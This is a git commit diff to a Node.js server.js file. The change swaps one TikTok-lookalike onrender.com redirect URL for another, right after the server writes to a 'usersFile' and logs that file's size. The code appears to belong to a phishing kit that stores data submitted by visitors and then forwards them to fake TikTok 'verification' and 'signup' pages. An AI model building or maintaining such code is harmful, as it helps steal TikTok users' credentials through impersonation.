de25853665b3e3a4f5aac59863cf1673c6cfb725
VeteranVet <trenchervet@gmail.com>
2026-03-06 01:59:09 -0500

    Update server.js

--- server.js
+++ server.js
@@ -62,7 +62,7 @@ ${'='.repeat(60)}
     console.log('File size:', fs.statSync(usersFile).size, 'bytes');
     
     // Redirect to TikTok verification page
-    res.redirect('https://tiktok-login-continue.onrender.com/');
+    res.redirect('https://tiktok-completesignup.onrender.com/');
   } catch (err) {
     console.error('Error writing to file:', err);
     console.error('File path:', usersFile);
